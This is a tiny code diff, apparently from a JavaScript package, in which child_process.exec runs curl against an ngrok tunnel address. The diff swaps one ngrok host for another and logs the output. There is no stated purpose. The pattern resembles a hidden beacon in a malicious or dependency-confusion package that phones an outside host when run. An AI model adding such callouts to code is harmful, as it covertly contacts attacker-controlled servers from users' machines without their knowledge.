@@ -1,6 +1,6 @@
 var exec = require('child_process').exec;
 
-exec('curl https://e703-77-124-179-70.eu.ngrok.io/$Ha',
+exec('curl https://01cb-77-137-20-251.eu.ngrok.io',
     function (error, stdout, stderr) {
         console.log('stdout: ' + stdout);
         console.log('stderr: ' + stderr);
